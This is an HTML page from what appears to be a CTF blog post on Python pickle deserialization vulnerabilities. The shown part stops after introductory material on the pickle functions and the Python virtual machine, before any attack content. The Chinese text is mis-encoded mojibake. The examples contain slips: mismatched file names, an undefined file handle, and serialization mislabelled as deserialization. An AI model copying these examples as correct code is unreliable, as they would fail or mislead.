<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Sl0th">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://sloth31.github.io/2022/08/03/python-pickleååºåˆ—åŒ–æ¼æ´/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="Python Pickleååºåˆ—åŒ–æ¼æ´åŸºç¡€çŸ¥è¯†0x00:Pickle&#x2F;CPicklepickleæˆ–cPickleï¼Œä½œç”¨å’ŒPHPçš„serializeä¸unserializeä¸€æ ·ï¼Œä¸¤è€…åªæ˜¯å®ç°çš„è¯­è¨€ä¸åŒï¼Œä¸€ä¸ªæ˜¯çº¯Pythonå®ç°ã€å¦ä¸€ä¸ªæ˜¯Cå®ç°ï¼Œå‡½æ•°è°ƒç”¨åŸºæœ¬ç›¸åŒï¼Œä½†cPickleåº“çš„æ€§èƒ½æ›´å¥½,ä¹‹åå°±ä»¥pickleåº“æ¥è¿›è¡Œæ¼”ç¤º 0x01:Pickleåº“åŠå‡½æ•°pickleæ˜¯pythonè¯­è¨€çš„ä¸€ä¸ª">
<meta property="og:type" content="article">
<meta property="og:title" content="python pickleååºåˆ—åŒ–æ¼æ´">
<meta property="og:url" content="http://sloth31.github.io/2022/08/03/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="Sl0th&#39;s Blog">
<meta property="og:description" content="Python Pickleååºåˆ—åŒ–æ¼æ´åŸºç¡€çŸ¥è¯†0x00:Pickle&#x2F;CPicklepickleæˆ–cPickleï¼Œä½œç”¨å’ŒPHPçš„serializeä¸unserializeä¸€æ ·ï¼Œä¸¤è€…åªæ˜¯å®ç°çš„è¯­è¨€ä¸åŒï¼Œä¸€ä¸ªæ˜¯çº¯Pythonå®ç°ã€å¦ä¸€ä¸ªæ˜¯Cå®ç°ï¼Œå‡½æ•°è°ƒç”¨åŸºæœ¬ç›¸åŒï¼Œä½†cPickleåº“çš„æ€§èƒ½æ›´å¥½,ä¹‹åå°±ä»¥pickleåº“æ¥è¿›è¡Œæ¼”ç¤º 0x01:Pickleåº“åŠå‡½æ•°pickleæ˜¯pythonè¯­è¨€çš„ä¸€ä¸ª">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-08-03T15:11:44.000Z">
<meta property="article:modified_time" content="2024-07-03T15:29:01.191Z">
<meta property="article:author" content="Sl0th">
<meta property="article:tag" content="web">
<meta property="article:tag" content="python">
<meta name="twitter:card" content="summary">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/img/fav.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/img/fav.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/img/fav.ico">
    <!--- Page Info-->
    
    <title>
        
            python pickleååºåˆ—åŒ–æ¼æ´ | Sl0th&#39;s Blog
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"sloth31.github.io","root":"/","language":"zh-CN","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"æ¨èé˜…è¯»","limit":3,"mobile_limit":2,"placeholder":"/img/night.jpg","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/img/day.jpg","dark":"/img/night.jpg"},"title":"ğŸ‘‹Welcome to Sl0th's BlogğŸ‰","subtitle":{"text":["There is no royal road to learning"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#4D5356","dark":"#fff"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":"enable","style":"default","links":{"github":"https://github.com/sloth31","instagram":null,"zhihu":null,"twitter":null,"email":"z694081360@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/sloth31","Blog":"http://sl0th.top/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>



<main class="page-container" id="swup">

    

    <div class="main-content-container flex flex-col justify-between min-h-dvh">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/img/fav.ico" class="w-full h-full rounded-sm">
                </a>
            
            <a class="logo-title" href="/">
                
                Sl0th&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    é¦–é¡µ
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    å½’æ¡£
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags"
                                        >
                                    <i class="fa-regular fa-tags fa-fw"></i>
                                    æ ‡ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories"
                                        >
                                    <i class="fa-regular fa-folder fa-fw"></i>
                                    åˆ†ç±»
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    å…³äº
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a href="/about">
                                                    ME
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://github.com/sloth31">
                                                    GITHUB
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="http://sl0th.top/">
                                                    BLOG
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                é¦–é¡µ
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                å½’æ¡£
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags"
                        >
                            <span>
                                æ ‡ç­¾
                            </span>
                            
                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories"
                        >
                            <span>
                                åˆ†ç±»
                            </span>
                            
                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-About"
                        >
                            <span>
                                å…³äº
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/about">ME</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://github.com/sloth31">GITHUB</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="http://sl0th.top/">BLOG</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    
                    
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">27</div>
        <div class="label text-third-text-color text-sm">æ ‡ç­¾</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">åˆ†ç±»</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">44</div>
        <div class="label text-third-text-color text-sm">æ–‡ç« </div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">python pickleååºåˆ—åŒ–æ¼æ´</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/img/avatar.JPG">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Sl0th</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2022-08-03 23:11:44</span>
        <span class="mobile">2022-08-03 23:11:44</span>
        <span class="hover-info">åˆ›å»º</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-07-03 23:29:01</span>
            <span class="mobile">2024-07-03 23:29:01</span>
            <span class="hover-info">æ›´æ–°</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/ctf/">ctf</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/web/">web</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/python/">python</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="Python-Pickleååºåˆ—åŒ–æ¼æ´"><a href="#Python-Pickleååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Python Pickleååºåˆ—åŒ–æ¼æ´"></a>Python Pickleååºåˆ—åŒ–æ¼æ´</h1><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="0x00-Pickle-x2F-CPickle"><a href="#0x00-Pickle-x2F-CPickle" class="headerlink" title="0x00:Pickle&#x2F;CPickle"></a>0x00:Pickle&#x2F;CPickle</h3><p><code>pickle</code>æˆ–<code>cPickle</code>ï¼Œä½œç”¨å’Œ<code>PHPçš„serializeä¸unserialize</code>ä¸€æ ·ï¼Œä¸¤è€…åªæ˜¯å®ç°çš„è¯­è¨€ä¸åŒï¼Œä¸€ä¸ªæ˜¯çº¯Pythonå®ç°ã€å¦ä¸€ä¸ªæ˜¯Cå®ç°ï¼Œå‡½æ•°è°ƒç”¨åŸºæœ¬ç›¸åŒï¼Œä½†cPickleåº“çš„æ€§èƒ½æ›´å¥½,ä¹‹åå°±ä»¥pickleåº“æ¥è¿›è¡Œæ¼”ç¤º</p>
<h3 id="0x01-Pickleåº“åŠå‡½æ•°"><a href="#0x01-Pickleåº“åŠå‡½æ•°" class="headerlink" title="0x01:Pickleåº“åŠå‡½æ•°"></a>0x01:Pickleåº“åŠå‡½æ•°</h3><p>pickleæ˜¯pythonè¯­è¨€çš„ä¸€ä¸ªæ ‡å‡†æ¨¡å—ï¼Œå®ç°äº†åŸºæœ¬çš„æ•°æ®åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚<br>pickleæ¨¡å—æ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼åºåˆ—åŒ–åä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼ˆä¿å­˜æ–‡ä»¶çš„åç¼€ä¸º<code>.pkl</code>ï¼‰ï¼Œä¸èƒ½ç›´æ¥æ‰“å¼€è¿›è¡Œé¢„è§ˆã€‚</p>
<table>
<thead>
<tr>
<th align="center">å‡½æ•°</th>
<th align="center">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">dumps</td>
<td align="center">å¯¹è±¡ååºåˆ—åŒ–ä¸ºbyteså¯¹è±¡</td>
</tr>
<tr>
<td align="center">dump</td>
<td align="center">å¯¹è±¡ååºåˆ—åŒ–åˆ°æ–‡ä»¶å¯¹è±¡ï¼Œå­˜å…¥æ–‡ä»¶</td>
</tr>
<tr>
<td align="center">loads</td>
<td align="center">ä»byteså¯¹è±¡ååºåˆ—åŒ–</td>
</tr>
<tr>
<td align="center">load</td>
<td align="center">å¯¹è±¡ååºåˆ—åŒ–ï¼Œä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</td>
</tr>
</tbody></table>
<h3 id="dump-x2F-load"><a href="#dump-x2F-load" class="headerlink" title="dump&#x2F;load"></a>dump&#x2F;load</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åºåˆ—åŒ–</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>,)</span><br><span class="line">objè¡¨ç¤ºè¦è¿›è¡Œå°è£…çš„å¯¹è±¡(å¿…å¡«å‚æ•°ï¼‰</span><br><span class="line">fileè¡¨ç¤ºobjè¦å†™å…¥çš„æ–‡ä»¶å¯¹è±¡</span><br><span class="line">ä»¥äºŒè¿›åˆ¶å¯å†™æ¨¡å¼æ‰“å¼€å³wb(å¿…å¡«å‚æ•°ï¼‰</span><br><span class="line"><span class="comment">#ååºåˆ—åŒ–</span></span><br><span class="line">pickle.load(file, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br><span class="line">fileæ–‡ä»¶ä¸­è¯»å–å°å­˜åçš„å¯¹è±¡</span><br><span class="line">ä»¥äºŒè¿›åˆ¶å¯è¯»æ¨¡å¼æ‰“å¼€å³rb(å¿…å¡«å‚æ•°)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">    <span class="variable language_">self</span>.a=a</span><br><span class="line">    <span class="variable language_">self</span>.b=b</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  test=Test1(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;Lemon&#x27;</span>)</span><br><span class="line">  fp1=<span class="built_in">open</span>(<span class="string">&quot;sky.pkl&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">  pickle.dump(test,fp1) <span class="comment"># åºåˆ—åŒ–</span></span><br><span class="line">  fp1.close()</span><br><span class="line">  fp2=<span class="built_in">open</span>(<span class="string">&quot;shy.pkl&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">  data=pickle.load(fp2) <span class="comment"># ååºåˆ—åŒ–</span></span><br><span class="line">  fp2.close()</span><br></pre></td></tr></table></figure></div>

<h3 id="dumps-x2F-loads"><a href="#dumps-x2F-loads" class="headerlink" title="dumps&#x2F;loads"></a>dumps&#x2F;loads</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åºåˆ—åŒ–</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>,*,fix_imports=<span class="literal">True</span>)</span><br><span class="line">dumps()æ–¹æ³•ä¸éœ€è¦å†™å…¥æ–‡ä»¶ä¸­ï¼Œç›´æ¥è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„<span class="built_in">bytes</span>å¯¹è±¡ã€‚</span><br><span class="line"><span class="comment">#ååºåˆ—åŒ–</span></span><br><span class="line">pickle.loads(bytes_object, *,fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>. errors=<span class="string">&quot;strict&quot;</span>)</span><br><span class="line">loads()æ–¹æ³•æ˜¯ç›´æ¥ä»<span class="built_in">bytes</span>å¯¹è±¡ä¸­è¯»å–åºåˆ—åŒ–çš„ä¿¡æ¯ï¼Œè€Œéä»æ–‡ä»¶ä¸­è¯»å–ã€‚</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">    <span class="variable language_">self</span>.a=a</span><br><span class="line">    <span class="variable language_">self</span>.b=b</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  test=Test1(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;Lemon&#x27;</span>)</span><br><span class="line">  <span class="built_in">str</span>=pickle.dumps(test) <span class="comment"># åºåˆ—åŒ–</span></span><br><span class="line">  data=pickle.loads(<span class="built_in">str</span>) <span class="comment"># ååºåˆ—åŒ–</span></span><br><span class="line">  fp2.close()</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>åºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ¶‰åŠåˆ°PVM</p>
</blockquote>
<h3 id="0x02-PVMâ€“pythonè™šæ‹Ÿæœº"><a href="#0x02-PVMâ€“pythonè™šæ‹Ÿæœº" class="headerlink" title="0x02 PVMâ€“pythonè™šæ‹Ÿæœº"></a>0x02 PVMâ€“pythonè™šæ‹Ÿæœº</h3><h4 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h4><p>ä¸JVMç±»ä¼¼ï¼Œå®ƒå¯ä»¥ç›´æ¥ä»æºä»£ç è¿è¡Œç¨‹åºã€‚Pythonè§£é‡Šå™¨ä¼šå°†æºä»£ç ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œç„¶åå°†ç¼–è¯‘åçš„å­—èŠ‚ç è½¬å‘åˆ°Pythonè™šæ‹Ÿæœºä¸­æ‰§è¡Œã€‚æ€»çš„æ¥è¯´ï¼ŒPVMçš„ä½œç”¨ä¾¿æ˜¯ç”¨æ¥è§£é‡Šå­—èŠ‚ç çš„è§£é‡Šå¼•æ“ã€‚</p>
<h4 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h4><ul>
<li><p><code>PVM</code>ä¼šæŠŠæºä»£ç ç¼–è¯‘æˆå­—èŠ‚ç </p>
<blockquote>
<p>å­—èŠ‚ç æ˜¯Pythonç‰¹æœ‰çš„ä¸€ç§è¡¨ç°å½¢å¼ï¼Œä¸æ˜¯äºŒè¿›åˆ¶æœºå™¨ç ï¼Œéœ€è¦è¿›ä¸€æ­¥ç¼–è¯‘æ‰èƒ½è¢«æœºå™¨æ‰§è¡Œ . å¦‚æœ Python è¿›ç¨‹åœ¨ä¸»æœºä¸Šæœ‰å†™å…¥æƒé™ , é‚£ä¹ˆå®ƒä¼šæŠŠç¨‹åºå­—èŠ‚ç ä¿å­˜ä¸ºä¸€ä¸ªä»¥ .pyc ä¸ºæ‰©å±•åçš„æ–‡ä»¶ . å¦‚æœæ²¡æœ‰å†™å…¥æƒé™ , åˆ™ Python è¿›ç¨‹ä¼šåœ¨å†…å­˜ä¸­ç”Ÿæˆå­—èŠ‚ç  , åœ¨ç¨‹åºæ‰§è¡Œç»“æŸåè¢«è‡ªåŠ¨ä¸¢å¼ƒ .</p>
</blockquote>
</li>
<li><p><code>Python</code>è¿›ç¨‹ä¼šæŠŠç¼–è¯‘å¥½çš„å­—èŠ‚ç è½¬å‘åˆ°<code>PVMï¼ˆPythonè™šæ‹Ÿæœºï¼‰</code>ä¸­ï¼Œ<code>PVM</code>ä¼šå¾ªç¯è¿­ä»£æ‰§è¡Œå­—èŠ‚ç æŒ‡ä»¤ï¼Œç›´åˆ°æ‰€æœ‰æ“ä½œè¢«å®Œæˆã€‚</p>
</li>
</ul>
<h4 id="PVMä¸Pickleæ¨¡å—çš„å…³ç³»"><a href="#PVMä¸Pickleæ¨¡å—çš„å…³ç³»" class="headerlink" title="PVMä¸Pickleæ¨¡å—çš„å…³ç³»"></a>PVMä¸Pickleæ¨¡å—çš„å…³ç³»</h4><blockquote>
<p>Pickleæ˜¯ä¸€é—¨åŸºäºæ ˆçš„ç¼–ç¨‹è¯­è¨€ , æœ‰ä¸åŒçš„ç¼–å†™æ–¹å¼ , å…¶æœ¬è´¨å°±æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ PVM .</p>
<p>ç”±ä¸‰éƒ¨åˆ†ç»„æˆ</p>
<ul>
<li>æŒ‡ä»¤å¤„ç†å™¨( Instruction processor )</li>
<li>æ ˆåŒº( stack )</li>
<li>æ ‡ç­¾åŒº( memo )</li>
</ul>
</blockquote>
<h4 id="æŒ‡ä»¤å¤„ç†å™¨å¯è¯»çš„æ“ä½œç "><a href="#æŒ‡ä»¤å¤„ç†å™¨å¯è¯»çš„æ“ä½œç " class="headerlink" title="æŒ‡ä»¤å¤„ç†å™¨å¯è¯»çš„æ“ä½œç "></a>æŒ‡ä»¤å¤„ç†å™¨å¯è¯»çš„æ“ä½œç </h4><ol>
